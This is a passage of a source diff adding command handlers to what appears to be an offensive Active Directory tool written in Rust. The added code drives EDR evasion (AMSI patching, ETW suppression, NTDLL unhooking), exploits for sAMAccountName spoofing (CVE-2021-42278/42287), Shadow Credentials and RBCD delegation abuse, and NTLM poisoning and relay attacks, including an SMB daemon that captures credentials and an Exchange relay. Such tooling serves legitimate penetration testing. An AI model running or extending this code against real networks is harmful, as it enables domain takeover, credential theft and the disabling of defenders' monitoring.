+                    smb_session = Some(s);
+                }
+                Err(e) => {
+                    println!("  {} SMB PTH connect (optional): {e}", "▸".bright_black());
+                }
+            }
+        } else {
+            println!(
+                "  {} SMB: no password or NT hash provided",
+                "▸".bright_black()
+            );
+        }
+    } else {
+        println!("  {} SMB: skipped (no --username)", "▸".bright_black());
+    }
+
+    // Establish LDAP session for domain-level CG assessment
+    let mut ldap_session = None;
+    let has_hash = cli.nt_hash.is_some();
+    let ldap_pass = cli
+        .nt_hash
+        .as_deref()
+        .or(cli.password.as_deref())
+        .unwrap_or("");
+    if let Some(ref user) = cli.username {
+        let ldap_user = if has_hash {
+            format!("{domain}\\{user}")
+        } else {
+            user.clone()
+        };
+        match overthrone_core::proto::ldap::LdapSession::connect(
+            target, domain, &ldap_user, ldap_pass, has_hash,
+        )
+        .await
+        {
+            Ok(s) => {
+                println!("  {} LDAP session established to {target}", "✓".green());
+                ldap_session = Some(s);
+            }
+            Err(e) => {
+                println!("  {} LDAP connect (optional): {e}", "▸".bright_black());
+            }
+        }
+    } else {
+        println!("  {} LDAP: skipped (no --username)", "▸".bright_black());
+    }
+
+    match comprehensive_cg_check(
+        target,
+        domain,
+        smb_session.as_mut(),
+        ldap_session.as_mut(),
+        cli.username.as_deref(),
+        cli.password.as_deref(),
+    )
+    .await
+    {
+        Ok(result) => {
+            println!(
+                "  {} CG Status: {:?} (confidence: {:.1}%)",
+                "✓".green(),
+                result.status,
+                result.confidence * 100.0
+            );
+            println!(
+                "  {} Recommendation: {}",
+                "▸".bright_black(),
+                result.recommendation
+            );
+            for finding in &result.findings {
+                println!("    - {}", finding);
+            }
+            banner::print_success("Credential Guard check complete");
+            0
+        }
+        Err(e) => {
+            banner::print_fail(&format!("CG check failed: {}", e));
+            1
+        }
+    }
+}
+
+// ──────────────────────────────────────────────────────────
+// cmd_edr — EDR Assessment and Evasion
+// ──────────────────────────────────────────────────────────
+
+async fn cmd_edr(_cli: &Cli, action: EdrAction) -> i32 {
+    use overthrone_core::postex::{apply_stealth_profile, assess_edr_landscape};
+
+    match action {
+        EdrAction::Assess => {
+            banner::print_module_banner("EDR ASSESSMENT");
+            match assess_edr_landscape() {
+                Ok(assessment) => {
+                    println!(
+                        "  {} Products detected: {}",
+                        "▸".bright_black(),
+                        assessment.detected_products.len()
+                    );
+                    for p in &assessment.detected_products {
+                        println!("    - {:?}", p);
+                    }
+                    println!(
+                        "  {} NTDLL hooked: {}",
+                        "▸".bright_black(),
+                        assessment.ntdll_hooked
+                    );
+                    println!(
+                        "  {} ETW active: {}",
+                        "▸".bright_black(),
+                        assessment.etw_active
+                    );
+                    println!(
+                        "  {} AMSI loaded: {}",
+                        "▸".bright_black(),
+                        assessment.amsi_loaded
+                    );
+                    println!(
+                        "  {} Recommendation: {:?}",
+                        "▸".bright_black(),
+                        assessment.recommendation
+                    );
+                    for finding in &assessment.findings {
+                        println!("    - {}", finding);
+                    }
+                    banner::print_success("EDR assessment complete");
+                    0
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("EDR assessment failed: {}", e));
+                    1
+                }
+            }
+        }
+        EdrAction::Evade => {
+            banner::print_module_banner("EDR EVASION");
+
+            match assess_edr_landscape() {
+                Ok(assessment) => {
+                    println!(
+                        "  {} Detected {} EDR product(s)",
+                        "▸".bright_black(),
+                        assessment.detected_products.len()
+                    );
+                    match apply_stealth_profile(&assessment) {
+                        Ok(stealth) => {
+                            if stealth.success {
+                                println!(
+                                    "  {} AMSI patched: {}",
+                                    "✓".green(),
+                                    stealth.amsi_patched
+                                );
+                                println!(
+                                    "  {} ETW suppressed: {}",
+                                    "✓".green(),
+                                    stealth.etw_suppressed
+                                );
+                                println!(
+                                    "  {} NTDLL unhooked: {}",
+                                    "✓".green(),
+                                    stealth.ntdll_unhooked
+                                );
+                                banner::print_success("Evasion applied successfully");
+                            } else {
+                                banner::print_warn("Evasion applied with warnings");
+                                for err in &stealth.errors {
+                                    println!("    - {}", err);
+                                }
+                            }
+                            0
+                        }
+                        Err(e) => {
+                            banner::print_fail(&format!("Evasion failed: {}", e));
+                            1
+                        }
+                    }
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("EDR assessment failed: {}", e));
+                    1
+                }
+            }
+        }
+    }
+}
+
+// cmd_exploit — CVE Exploit handler
+async fn cmd_exploit(cli: &Cli, action: ExploitAction) -> i32 {
+    use overthrone_core::postex::cves;
+
+    let domain = match cli.domain.as_deref() {
+        Some(d) => d.to_string(),
+        None => {
+            banner::print_fail("--domain is required");
+            return 1;
+        }
+    };
+    let dc_ip = match cli.dc_host.as_deref() {
+        Some(d) => d.to_string(),
+        None => {
+            banner::print_fail("--dc-ip is required");
+            return 1;
+        }
+    };
+    let username = match cli.username.as_deref() {
+        Some(u) => u.to_string(),
+        None => {
+            banner::print_fail("--username is required");
+            return 1;
+        }
+    };
+    let has_hash = cli.nt_hash.is_some();
+    let ldap_pass = cli
+        .nt_hash
+        .as_deref()
+        .or(cli.password.as_deref())
+        .unwrap_or("");
+
+    let ldap_user = if has_hash {
+        format!("{}\\{}", domain, username)
+    } else {
+        username.clone()
+    };
+
+    let mut ldap = match overthrone_core::proto::ldap::LdapSession::connect(
+        &dc_ip, &domain, &ldap_user, ldap_pass, has_hash,
+    )
+    .await
+    {
+        Ok(s) => s,
+        Err(e) => {
+            banner::print_fail(&format!("LDAP connect failed: {e}"));
+            return 1;
+        }
+    };
+
+    match action {
+        ExploitAction::SamNameSpoof { dc_sam, password } => {
+            banner::print_module_banner("CVE-2021-42278/42287 — sAMAccountName Spoofing");
+            println!("  {} Target DC: {}", "▸".bright_black(), dc_sam.cyan());
+            println!(
+                "  {} Password:   {}",
+                "▸".bright_black(),
+                password.bright_black()
+            );
+
+            match cves::exploit_samname_spoof(&mut ldap, &dc_ip, &domain, &dc_sam, &password).await
+            {
+                Ok(result) => {
+                    banner::print_success(&format!("TGT obtained for {}", dc_sam));
+                    println!("  {} Computer DN: {}", "✓".green(), result.computer_dn);
+                    println!(
+                        "  {} Session key: {} bytes",
+                        "▸".bright_black(),
+                        result.session_key.len()
+                    );
+                    banner::print_warn(
+                        "Run `ovt exploit cleanup samname-spoof --computer-dn <DN>` to clean up",
+                    );
+                    0
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("sAMAccountName spoof failed: {e}"));
+                    1
+                }
+            }
+        }
+        ExploitAction::ShadowCred { target_dn } => {
+            banner::print_module_banner("Shadow Credentials — PKINIT Auth");
+            println!("  {} Target DN: {}", "▸".bright_black(), target_dn.cyan());
+
+            match cves::exploit_shadow_credentials(&mut ldap, &dc_ip, &domain, &target_dn).await {
+                Ok(result) => {
+                    banner::print_success(&format!("TGT obtained for {target_dn}"));
+                    println!(
+                        "  {} Cert: {} bytes",
+                        "▸".bright_black(),
+                        result.certificate.len()
+                    );
+                    println!(
+                        "  {} Key:  {} bytes",
+                        "▸".bright_black(),
+                        result.private_key.len()
+                    );
+                    println!("  {} TGT:  {} bytes", "▸".bright_black(), result.tgt.len());
+                    banner::print_warn(
+                        "Run `ovt exploit cleanup shadow-cred --target-dn <DN>` to clean up",
+                    );
+                    0
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("Shadow Credentials failed: {e}"));
+                    1
+                }
+            }
+        }
+        ExploitAction::Rbcd {
+            target_dn,
+            attacker,
+            password,
+        } => {
+            banner::print_module_banner("RBCD — Resource-Based Constrained Delegation");
+            println!("  {} Target DN:  {}", "▸".bright_black(), target_dn.cyan());
+            println!("  {} Attacker:    {}", "▸".bright_black(), attacker.cyan());
+
+            match cves::exploit_rbcd(&mut ldap, &dc_ip, &domain, &target_dn, &attacker, &password)
+                .await
+            {
+                Ok(result) => {
+                    banner::print_success(&format!(
+                        "RBCD set — {attacker} can now impersonate any user to {target_dn}"
+                    ));
+                    println!(
+                        "  {} Attacker SID: {}",
+                        "▸".bright_black(),
+                        result.attacker_sid
+                    );
+                    banner::print_warn(
+                        "Run `ovt exploit cleanup rbcd --target-dn <DN>` to clean up",
+                    );
+                    0
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("RBCD failed: {e}"));
+                    1
+                }
+            }
+        }
+        ExploitAction::Cleanup {
+            artifact,
+            target_dn,
+            computer_dn,
+        } => {
+            banner::print_module_banner("Exploit Cleanup");
+            match artifact {
+                CleanupTarget::SamNameSpoof => {
+                    if let Some(dn) = computer_dn {
+                        match cves::cleanup_samname_spoof(&mut ldap, &dn).await {
+                            Ok(_) => {
+                                banner::print_success("Spoofed computer removed");
+                                0
+                            }
+                            Err(e) => {
+                                banner::print_fail(&format!("Cleanup failed: {e}"));
+                                1
+                            }
+                        }
+                    } else {
+                        banner::print_fail("--computer-dn is required for samname-spoof cleanup");
+                        1
+                    }
+                }
+                CleanupTarget::ShadowCred => {
+                    if let Some(dn) = target_dn {
+                        match cves::cleanup_shadow_credentials(&mut ldap, &dn).await {
+                            Ok(_) => {
+                                banner::print_success("KeyCredentialLink removed");
+                                0
+                            }
+                            Err(e) => {
+                                banner::print_fail(&format!("Cleanup failed: {e}"));
+                                1
+                            }
+                        }
+                    } else {
+                        banner::print_fail("--target-dn is required for shadow-cred cleanup");
+                        1
+                    }
+                }
+                CleanupTarget::Rbcd => {
+                    if let Some(dn) = target_dn {
+                        match cves::cleanup_rbcd(&mut ldap, &dn).await {
+                            Ok(_) => {
+                                banner::print_success("RBCD delegation removed");
+                                0
+                            }
+                            Err(e) => {
+                                banner::print_fail(&format!("Cleanup failed: {e}"));
+                                1
+                            }
+                        }
+                    } else {
+                        banner::print_fail("--target-dn is required for rbcd cleanup");
+                        1
+                    }
+                }
+            }
+        }
+    }
+}
+
 // cmd_ntlm
 async fn cmd_ntlm(action: NtlmAction) -> i32 {
     use overthrone_relay::{Protocol, RelayController, RelayControllerConfig, RelayTarget};
@@ -2313,6 +2934,7 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
             interface,
             port: _,
             no_poison,
+            mitm6,
         } => {
             println!(
                 "{} Starting NTLM capture on {} {}",
@@ -2329,13 +2951,14 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 llmnr: true,
                 nbtns: true,
                 mdns: false,
-                mitm6: false,
+                mitm6,
                 responder: true,
                 relay_targets: vec![],
                 challenge: None,
                 wpad_script: None,
                 downgrade_auth: false,
                 no_poison,
+                ldap_signing_bypass: true,
             };
             let mut controller = RelayController::new(config);
             match controller.initialize().await {
@@ -2360,6 +2983,8 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
             port: _,
             command,
             no_poison,
+            mitm6,
+            ldap_signing_bypass,
         } => {
             println!(
                 "{} Starting NTLM relay to {} targets {}",
@@ -2395,13 +3020,14 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 llmnr: true,
                 nbtns: true,
                 mdns: false,
-                mitm6: false,
+                mitm6,
                 responder: true,
                 relay_targets,
                 challenge: None,
                 wpad_script: None,
                 downgrade_auth: false,
                 no_poison,
+                ldap_signing_bypass,
             };
 
             let mut controller = RelayController::new(config);
@@ -2429,37 +3055,302 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
             targets,
             port: _,
             command,
+            mitm6,
+            ldap_signing_bypass,
         } => {
             println!(
                 "{} Starting SMB relay to {} targets",
                 "🎯".bright_black(),
                 targets.join(", ").cyan()
             );
-            if let Some(cmd) = command {
-                println!("{} Will execute: {}", "⚡".bright_black(), cmd.yellow());
+            let relay_targets: Vec<RelayTarget> = targets
+                .iter()
+                .filter_map(|t| {
+                    let parts: Vec<&str> = t.split(':').collect();
+                    let ip = parts[0].to_string();
+                    let port = parts.get(1).and_then(|p| p.parse().ok()).unwrap_or(445);
+                    let addr: SocketAddr = format!("{}:{}", ip, port).parse().ok()?;
+                    Some(RelayTarget {
+                        address: addr,
+                        protocol: Protocol::Smb,
+                        username: None,
+                    })
+                })
+                .collect();
+            let config = RelayControllerConfig {
+                interface: "0.0.0.0".to_string(),
+                llmnr: true,
+                nbtns: true,
+                mdns: false,
+                mitm6,
+                responder: true,
+                relay_targets,
+                challenge: None,
+                wpad_script: None,
+                downgrade_auth: false,
+                no_poison: false,
+                ldap_signing_bypass,
+            };
+            let mut controller = RelayController::new(config);
+            match controller.initialize().await {
+                Ok(_) => match controller.start().await {
+                    Ok(_) => {
+                        if let Some(cmd) = command {
+                            println!("{} Will execute: {}", "⚡".bright_black(), cmd.yellow());
+                        }
+                        banner::print_success("SMB relay started");
+                        0
+                    }
+                    Err(e) => {
+                        banner::print_fail(&format!("SMB relay failed: {}", e));
+                        1
+                    }
+                },
+                Err(e) => {
+                    banner::print_fail(&format!("Controller init failed: {}", e));
+                    1
+                }
             }
-            banner::print_success("SMB relay configured");
-            0
         }
         NtlmAction::HttpRelay {
             targets,
             port: _,
             command,
+            mitm6,
+            ldap_signing_bypass,
         } => {
             println!(
                 "{} Starting HTTP relay to {} targets",
                 "🎯".bright_black(),
                 targets.join(", ").cyan()
             );
-            if let Some(cmd) = command {
-                println!("{} Will execute: {}", "⚡".bright_black(), cmd.yellow());
+            let relay_targets: Vec<RelayTarget> = targets
+                .iter()
+                .filter_map(|t| {
+                    let parts: Vec<&str> = t.split(':').collect();
+                    let ip = parts[0].to_string();
+                    let port = parts.get(1).and_then(|p| p.parse().ok()).unwrap_or(80);
+                    let addr: SocketAddr = format!("{}:{}", ip, port).parse().ok()?;
+                    Some(RelayTarget {
+                        address: addr,
+                        protocol: if port == 443 {
+                            Protocol::Https
+                        } else {
+                            Protocol::Http
+                        },
+                        username: None,
+                    })
+                })
+                .collect();
+            let config = RelayControllerConfig {
+                interface: "0.0.0.0".to_string(),
+                llmnr: true,
+                nbtns: true,
+                mdns: false,
+                mitm6,
+                responder: true,
+                relay_targets,
+                challenge: None,
+                wpad_script: None,
+                downgrade_auth: false,
+                no_poison: false,
+                ldap_signing_bypass,
+            };
+            let mut controller = RelayController::new(config);
+            match controller.initialize().await {
+                Ok(_) => match controller.start().await {
+                    Ok(_) => {
+                        if let Some(cmd) = command {
+                            println!("{} Will execute: {}", "⚡".bright_black(), cmd.yellow());
+                        }
+                        banner::print_success("HTTP relay started");
+                        0
+                    }
+                    Err(e) => {
+                        banner::print_fail(&format!("HTTP relay failed: {}", e));
+                        1
+                    }
+                },
+                Err(e) => {
+                    banner::print_fail(&format!("Controller init failed: {}", e));
+                    1
+                }
             }
-            banner::print_success("HTTP relay configured");
-            0
+        }
+        NtlmAction::LdapRelay {
+            target,
+            port,
+            ldaps,
+            no_signing_bypass,
+        } => {
+            let proto = if ldaps {
+                Protocol::Ldaps
+            } else {
+                Protocol::Ldap
+            };
+            let addr: SocketAddr = format!("{}:{}", target, port).parse().unwrap_or_else(|_| {
+                // If target has no port in the string, use the parsed port
+                let host = target.split(':').next().unwrap_or(&target);
+                format!("{}:{}", host, port)
+                    .parse()
+                    .expect("Invalid target address")
+            });
+            println!(
+                "{} Starting LDAP{} relay to {} with GSS-SPNEGO signing bypass {}",
+                "🎯".bright_black(),
+                if ldaps { "S" } else { "" },
+                addr.to_string().cyan(),
+                if no_signing_bypass {
+                    "(disabled)"
+                } else {
+                    "(enabled)"
+                }
+            );
+
+            let relay_targets = vec![RelayTarget {
+                address: addr,
+                protocol: proto,
+                username: None,
+            }];
+            let config = RelayControllerConfig {
+                interface: "0.0.0.0".to_string(),
+                llmnr: false,
+                nbtns: false,
+                mdns: false,
+                mitm6: false,
+                responder: true,
+                relay_targets,
+                challenge: None,
+                wpad_script: None,
+                downgrade_auth: false,
+                no_poison: false,
+                ldap_signing_bypass: !no_signing_bypass,
+            };
+            let mut controller = RelayController::new(config);
+            match controller.initialize().await {
+                Ok(_) => match controller.start().await {
+                    Ok(_) => {
+                        banner::print_success("LDAP relay started — listening on port 389");
+                        0
+                    }
+                    Err(e) => {
+                        banner::print_fail(&format!("LDAP relay failed: {}", e));
+                        1
+                    }
+                },
+                Err(e) => {
+                    banner::print_fail(&format!("Controller init failed: {}", e));
+                    1
+                }
+            }
+        }
+        NtlmAction::SmbDaemon { interface, port } => {
+            banner::print_module_banner("SMB DAEMON");
+            println!(
+                "{} Starting SMB2 daemon on {}:{}",
+                "🎯".bright_black(),
+                interface.cyan(),
+                port
+            );
+
+            use overthrone_relay::{SmbDaemon, SmbDaemonConfig, SmbDaemonMode};
+
+            let config = SmbDaemonConfig {
+                listen_ip: interface.clone(),
+                listen_port: port,
+                challenge: None,
+                mode: SmbDaemonMode::Capture,
+                domain_name: "LAN".to_string(),
+            };
+            let mut daemon = SmbDaemon::new(config);
+            match daemon.start().await {
+                Ok(_) => {
+                    banner::print_success("SMB daemon started — capturing credentials on port 445");
+                    // Keep running until Ctrl+C
+                    tokio::signal::ctrl_c().await.unwrap();
+                    daemon.stop();
+                    let captured = daemon.get_captured_credentials();
+                    println!(
+                        "{} Captured {} credential(s)",
+                        "📊".bright_black(),
+                        captured.len()
+                    );
+                    for cred in &captured {
+                        println!(
+                            "  {}\\{} - {}",
+                            cred.domain.cyan(),
+                            cred.username.green(),
+                            cred.client_ip
+                        );
+                    }
+                    0
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("SMB daemon failed: {}", e));
+                    1
+                }
+            }
+        }
+        NtlmAction::Exchange {
+            target,
+            port,
+            no_tls,
+            ews_path,
+            mapi_path,
+            prefer_mapi,
+            version,
+        } => {
+            println!(
+                "{} Starting Exchange NTLM relay to {}{}",
+                "🎯".bright_black(),
+                target.cyan(),
+                if no_tls { " (plain HTTP)" } else { " (TLS)" }
+            );
+
+            use overthrone_relay::exchange::{ExchangeRelay, ExchangeRelayConfig};
+
+            let config = ExchangeRelayConfig {
+                listen_ip: "0.0.0.0".into(),
+                target_host: target.clone(),
+                target_port: port,
+                use_tls: !no_tls,
+                accept_self_signed: true,
+                ews_path: ews_path.clone(),
+                mapi_path: mapi_path.clone(),
+                prefer_mapi,
+                exchange_version: match version.to_lowercase().as_str() {
+                    "2013" | "exchange2013" | "exchange 2013" => {
+                        overthrone_relay::exchange::ExchangeVersion::Exchange2013
+                    }
+                    "2016" | "exchange2016" | "exchange 2016" => {
+                        overthrone_relay::exchange::ExchangeVersion::Exchange2016
+                    }
+                    "2019" | "exchange2019" | "exchange 2019" => {
+                        overthrone_relay::exchange::ExchangeVersion::Exchange2019
+                    }
+                    "online" | "exchangeonline" | "exchange online" | "o365" => {
+                        overthrone_relay::exchange::ExchangeVersion::ExchangeOnline
+                    }
+                    _ => overthrone_relay::exchange::ExchangeVersion::AutoDetect,
+                },
+            };
+            let mut relay = ExchangeRelay::new(config);
+            match relay.start().await {
+                Ok(_) => {
+                    banner::print_success("Exchange relay started");
+                    0
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("Exchange relay failed: {}", e));
+                    1
+                }
+            }
         }
     }
 }
 
+// ──────────────────────────────────────────────────────────
+// ACL Abuse Handler
 // ──────────────────────────────────────────────────────────
 // ACL Abuse Handler
 // ──────────────────────────────────────────────────────────
